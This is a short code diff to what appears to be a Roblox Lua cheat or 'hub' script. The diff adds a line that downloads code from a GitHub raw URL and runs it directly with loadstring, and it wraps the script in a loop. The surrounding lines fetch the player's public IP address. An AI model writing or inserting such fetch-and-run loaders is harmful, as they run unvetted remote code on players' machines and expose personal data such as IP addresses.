@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dontletmecook/Minhub/main/MInhub"))()
+
+while wait(2) do
+
 local IP = game:HttpGet("https://v4.ident.me")
 plr = game:GetService'Players'.LocalPlayer
 local premium = true
